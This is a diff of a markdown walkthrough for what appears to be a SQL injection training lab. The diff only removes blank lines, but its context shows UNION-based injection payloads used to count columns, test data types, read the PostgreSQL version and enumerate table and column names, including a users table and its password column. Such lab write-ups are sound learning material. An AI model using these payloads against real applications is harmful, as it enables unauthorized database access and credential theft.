@@ -17,13 +17,11 @@ To solve the lab, log in as the administrator user.
 ' UNION SELECT NULL, NULL--
 ```
 
-
 2/ Determine the data type of columns
 
 ```sql
 ' UNION SELECT 'AAA', 'AAA'--
 ```
-
 
 3/ Determine the type and version of the database
 
@@ -34,7 +32,6 @@ To solve the lab, log in as the administrator user.
 ```text
 PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4)
 ```
-
 
 4/ Determine the schema names in the database
 
@@ -59,7 +56,6 @@ users_asobbt
 products
 ```
 
-
 6/ Determine the column names in the database
 
 ```sql
@@ -71,7 +67,6 @@ username_tdfarj
 password_blgfiu
 email
 ```
-
 
 7/ Determine the data
 
